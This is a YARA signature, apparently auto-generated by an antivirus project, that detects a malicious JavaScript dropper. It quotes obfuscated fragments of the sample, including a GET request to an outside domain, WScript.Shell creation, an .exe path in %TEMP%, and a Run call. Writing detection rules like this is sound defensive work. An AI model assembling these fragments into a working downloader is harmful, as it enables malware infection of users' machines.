rule sig_20160401_6eeaf0c5076a3f2524f42d21ac686279 {
  meta:
    description = "datamaliciousorder - file 20160401_6eeaf0c5076a3f2524f42d21ac686279.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dacf7ba3c6f081329435ec89b20111428330ee986fd8127f279ed17110dc1453"

  strings:
    $s1  = "XxwQh[FddXos](\"G\" + \"ET\", \"http://be-stlines-tore.com/j38sf\", false);" fullword ascii
    $s2  = "function NgaAkn(BotWy, UhIm){GmcEzj = GmcEzj * 1; return BotWy - UhIm;};" fullword ascii
    $s3  = "var NwNgz = function MidMok() {return WScript[HwRf](\"WScript\"+\".Shell\");}(), TcYil = 11;" fullword ascii
    $s4  = "if (XxwQh[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function YcNn(){return JyWz + \"\";};" fullword ascii
    $s6  = "function JjlRvs() {return NwNgz[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"kB1iAOy21SYhnT6k.ex\" + \"e\";};" fullword ascii
    $s7  = "function NfKch() {return ((GdRib == true) && (GdRib == TyCvu)) ? 1 : GmcEzj;};" fullword ascii
    $s8  = "TyCvu = true; " fullword ascii
    $s9  = "var XutLb = new this[\"Date\"]();" fullword ascii
    $s10 = "var VdVzh = false;" fullword ascii
    $s11 = "return NgaAkn(ZoaOn, EiuYg);" fullword ascii
    $s12 = "function ThSm()" fullword ascii
    $s13 = "function VmAr(){return HwRf;};" fullword ascii
    $s14 = "var GdRib = false;" fullword ascii
    $s15 = "}while (TlYg);" fullword ascii
    $s16 = "var TyCvu = false;" fullword ascii
    $s17 = "function UdaZy(RnUew){NwNgz[\"R\"+\"un\"](RnUew, GmcEzj, GmcEzj);};" fullword ascii
    $s18 = "function BjbMqp(LuwPkx) {var RyfRta = (1, 2, 3, 4, 5, LuwPkx); return RyfRta;};" fullword ascii
    $s19 = "GdRib = true; " fullword ascii
    $s20 = "function NuKj(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}